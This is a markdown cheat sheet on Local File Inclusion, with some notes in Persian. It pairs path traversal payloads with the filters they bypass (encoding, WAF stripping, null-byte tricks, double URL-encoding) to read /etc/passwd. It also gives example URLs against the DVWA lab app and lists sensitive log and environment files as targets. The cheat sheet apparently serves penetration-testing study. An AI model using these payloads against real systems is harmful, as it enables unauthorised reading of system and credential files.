# Local File Inclusion

## Concept
- از این آسیب پذیری  برای خواند فایل های تنظیمات روی hosting machine استفاده می شود
- همچنین فایل های تصادفی مانند /etc/passwd
- همچنین ممکن است منجر به Information Disclosure شود
- در LFI می توانیم فایل اجرا کنیم ولی در Directory Traversal فقط می توانیم فایل های روی سرور را بخوانیم
- حتما باید با Burp، پاسخ را intercept کنیم

## Bypass
- Encoding
  - ```.``` => %2e
  - ```/``` => %2f
  - ```../``` => %2e%2e%2f
- WAF Bypass
  - ```../``` => ```..././``` 
  - ```../``` => ```....//``` 

## Exploit
  - ```../../etc/passwd``` , ```../../../etc/passwd``` , ```../../../../etc/passwd``` , ...
  - ```/etc/passwd``` 
    - The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory 
  - ```....//....//etc/passwd``` , ```....//....//....//etc/passwd``` , ...
    - The application strips path traversal sequences from the user-supplied filename before using it 
  - ```..%252f..%252f..%252fetc/passwd``` , ```..%252f..%252f..%252fetc/passwd``` , ...
    - The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it 
  - ```/var/www/images/../../../etc/passwd```
    - The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder 
  - ```../../../etc/passwd%00.png```
    - The application validates that the supplied filename ends with the expected file extension 


  - ```example2.php?page=intro../../../../../../../../../../etc/passwd%00``` 
  - ```example2.php?page=intro%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00``` 
  - ```localhost/dvwa/vulnerabilities/fi/?page=..././..././phpinfo.php```
  - ```localhost/dvwa/vulnerabilities/fi/?page=file:////opt/lampp/htdocs/dvwa/phpinfo.php```

## Intersting files
  - ```/proc/self/environ```
  - ```/var/log/auth.log```
  - ```/var/log/apache2/access.log```
  
## Mitigation
  - Use static file inclusion. hard code the fiels that we want to include in the code.
